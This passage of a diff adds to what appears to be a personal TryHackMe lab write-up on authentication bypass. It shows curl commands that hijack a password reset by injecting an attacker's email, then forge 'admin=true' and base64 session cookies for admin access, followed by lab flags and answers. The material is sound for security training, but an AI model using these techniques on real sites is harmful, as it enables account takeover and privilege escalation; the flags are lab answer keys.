@@ -157,3 +157,163 @@ user@tryhackme:~$ curl 'http://10.10.235.218/customers/reset?email=robert@acmeit
                     <li><a href="/news">News</a></li>
                     <li><a href="/contact">Contact</a></li>
                     <li class="active"><a href="/customers">Customers</a></li>
+                </ul>
+            </div><!--/.nav-collapse -->
+        </div>
+    </nav><div class="container" style="padding-top:60px">
+    <h1 class="text-center">Acme IT Support</h1>
+    <h2 class="text-center">Reset Password</h2>
+    <div class="row">
+        <div class="col-md-4 col-md-offset-4">
+                        <div class="alert alert-success text-center">
+                <p>We'll send you a reset email to <strong>robert@acmeitsupport.thm</strong></p>
+            </div>
+                    </div>
+    </div>
+</div>
+<script src="/assets/jquery.min.js"></script>
+<script src="/assets/bootstrap.min.js"></script>
+<script src="/assets/site.js"></script>
+</body>
+</html>
+<!--
+Page Generated in 0.04433 Seconds using the THM Framework v1.2 ( https://static-labs.tryhackme.cloud/sites/thm-web-framework )
+-->
+```
+```text
+┌──(kali㉿kali)-[/usr/share/seclists/Usernames/Names]
+└─$ curl 'http://10.10.235.218/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Acme IT Support - Customer Login</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.12.0/css/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
+        <link rel="stylesheet" href="/assets/bootstrap.min.css">
+    <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+    <nav class="navbar navbar-inverse navbar-fixed-top">
+        <div class="container">
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="#">Acme IT Support</a>
+            </div>
+            <div id="navbar" class="collapse navbar-collapse">
+                <ul class="nav navbar-nav">
+                    <li><a href="/">Home</a></li>
+                    <li><a href="/news">News</a></li>
+                    <li><a href="/contact">Contact</a></li>
+                    <li class="active"><a href="/customers">Customers</a></li>
+                </ul>
+            </div><!--/.nav-collapse -->
+        </div>
+    </nav><div class="container" style="padding-top:60px">
+    <h1 class="text-center">Acme IT Support</h1>
+    <h2 class="text-center">Reset Password</h2>
+    <div class="row">
+        <div class="col-md-4 col-md-offset-4">
+                        <div class="alert alert-success text-center">
+                <p>We'll send you a reset email to <strong>attacker@hacker.com</strong></p>
+            </div>
+                    </div>
+    </div>
+</div>
+<script src="/assets/jquery.min.js"></script>
+<script src="/assets/bootstrap.min.js"></script>
+<script src="/assets/site.js"></script>
+</body>
+</html>
+<!--
+Page Generated in 0.04190 Seconds using the THM Framework v1.2 ( https://static-labs.tryhackme.cloud/sites/thm-web-framework )
+-->
+```
+```text
+┌──(kali㉿kali)-[/usr/share/seclists/Usernames/Names]
+└─$  curl 'http://10.10.235.218/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=witty@customer.acmeitsupport.thm'
+```
+### Cookie Tampering
+Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges. If you need a refresher on cookies, check out the HTTP In Detail room on task 6.
+Plain Text
+The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:
+Set-Cookie: logged_in=true; Max-Age=3600; Path=/
+Set-Cookie: admin=false; Max-Age=3600; Path=/
+We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.
+First, we'll start just by requesting the target page:
+Curl Request 1
+user@tryhackme$ curl http://10.10.235.218/cookie-test
+We can see we are returned a message of: Not Logged In
+Now we'll send another request with the logged_in cookie set to true and the admin cookie set to false:
+Curl Request 2
+user@tryhackme$ curl -H "Cookie: logged_in=true; admin=false" http://10.10.235.218/cookie-test
+We are given the message: Logged In As A User
+Finally, we'll send one last request setting both the logged_in and admin cookie to true:
+Curl Request 3
+user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://10.10.235.218/cookie-test
+This returns the result: Logged In As An Admin as well as a flag which you can use to answer question one.
+Hashing
+Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text. Here are some examples that you may come across:
+Original String
+Hash Method
+Output
+1
+md5
+c4ca4238a0b923820dcc509a6f75849b
+1
+sha-256
+6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
+1
+sha-512	4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a
+1
+sha1
+356a192b7913b04c54574d18c28d46e6395428ab
+You can see from the above table that the hash output from the same input string can significantly differ depending on the hash method in use. Even though the hash is irreversible, the same output is produced every time, which is helpful for us as services such as https://crackstation.net/ keep databases of billions of hashes and their original strings.
+Encoding
+Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.
+Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.
+Take the below data as an example which is set by the web server upon logging in:
+Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
+This string base64 decoded has the value of {"id":1,"admin": false} we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.
+```text
+┌──(kali㉿kali)-[/usr/share/seclists/Usernames/Names]
+└─$ curl http://10.10.235.218/cookie-test
+Not Logged In
+```
+
+## Exploitation
+```text
+┌──(kali㉿kali)-[/usr/share/seclists/Usernames/Names]
+└─$ curl -H "Cookie: logged_in=true; admin=false" http://10.10.235.218/cookie-test
+Logged In As A User
+```
+```text
+┌──(kali㉿kali)-[/usr/share/seclists/Usernames/Names]
+└─$ curl -H "Cookie: logged_in=true; admin=true" http://10.10.235.218/cookie-test
+Logged In As An Admin - THM{COOKIE_TAMPERING}
+```
+What is the flag from changing the plain text cookie values?
+What is the value of the md5 hash 3b2a1053e3270077456a79192070aa78 ?
+*463729* (crackstation)
+What is the base64 decoded value of VEhNe0JBU0U2NF9FTkNPRElOR30= ?
+Encode the following value using base64 {"id":1,"admin":true}
+*eyJpZCI6MSwiYWRtaW4iOnRydWV9*
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/58e63d7810ac4b23051e1dd4a24ef792.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f457baf00c357990014739bd6bce5b75.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3d97e3e37bf9e4db4f95f4f945a7e290.png)
+- *use password reset with robert@acmeitsupport.thm then username robert then create an account  like witty@customer.acmeitsupport.thm to get account robert and then support tickets -> Please don't tell anyone this! **THM{AUTH_BYPASS_COMPLETE}** *
+- What is the flag from Robert's support ticket? ***THM{AUTH_BYPASS_COMPLETE}** *
+- ***THM{COOKIE_TAMPERING}***
+- ***THM{BASE64_ENCODING}*** (cyberchef)
+
+## Notes / Lessons Learned
+[[Subdomain Enumeration]]
+
